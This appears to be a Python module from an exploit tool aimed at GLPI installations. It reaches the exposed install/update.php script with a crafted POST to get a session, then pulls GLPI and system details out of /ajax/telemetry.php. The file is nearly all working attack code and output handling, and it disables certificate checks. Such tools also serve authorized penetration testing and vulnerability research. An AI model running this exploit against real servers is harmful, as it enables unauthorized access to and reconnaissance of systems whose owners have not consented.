import requests
session = requests.Session()

from json import loads
from bs4 import BeautifulSoup

from handler.json_processor import format_keys

from urllib3 import disable_warnings
disable_warnings()

from rich.console import Console
console = Console()

def get_cookie(target) -> None:
    """ Get Cookies to be used as session """

    console.print(f"[cyan][>][/] Connecting to [yellow]{target}[/]", highlight=False)

    try:
        req = session.get(target, verify=False, timeout=120, allow_redirects=True)
        status_code = req.status_code

        if(req.ok):
            console.print(f"[green][+][/] Connected to [yellow]{target}[/]", highlight=False)
            check_update(target)

        else:
            console.print(f"[red][-][/] Error when connecting to [yellow]{target}[/] - {status_code}", highlight=False)
            return

    except Exception as error:
        console.print(f"[red][-][/] Error when connecting to [yellow]{target}[/] - {error}", highlight=False)
        return
    
def check_update(target) -> None:
    """ Check if the /install/update.php is accessible/exists """

    update_path = f"{target}/install/update.php"
    console.print(f"[cyan][>][/] Checking if {update_path} is accessible...", highlight=False)

    try:
        req = session.get(update_path, verify=False, timeout=120)
        status_code = req.status_code

        if(req.ok):
            payload = {'continuer': '1', 'from_update': '1'}
            headers = {'Content-Type': 'application/x-www-form-urlencoded'}
            post_req = session.post(update_path, verify=False, timeout=120, data=payload, headers=headers)

            if (post_req.ok):
                console.print(f"[green][+][/] {update_path} is accessible!", highlight=False)
                extract_info(target)
            else:
                console.print(f"[red][-][/] {update_path} is not acessible with POST method: {status_code}[/]", highlight=False)
                return
        else:
            console.print(f"[red][-][/] {update_path} is not acessible: {status_code}", highlight=False)
            return

    except Exception as error:
        console.print(f"[red][-][/] Error when trying to check if {update_path} is accessible: {error}", highlight=False)
        return

def extract_info(target) -> None:
    """ Extract information from /ajax/telemetry.php """

    telemetry_path = f"{target}/ajax/telemetry.php"
    console.print(f"[cyan][>][/] Extracting information through {telemetry_path}\n", highlight=False)

    try:
        req = session.post(telemetry_path, verify=False, timeout=200)
        resp = req.text
        resp_bs = BeautifulSoup(resp, "html.parser")
        json_content = resp_bs.find('code', class_='language-json').text
        parsed_json = loads(json_content)

        format_keys(parsed_json["glpi"])
        format_keys(parsed_json["system"])

    except Exception as error:
        console.print(f"[red][-][/] Error when trying to extract information from {telemetry_path}: {error}", highlight=False)
        return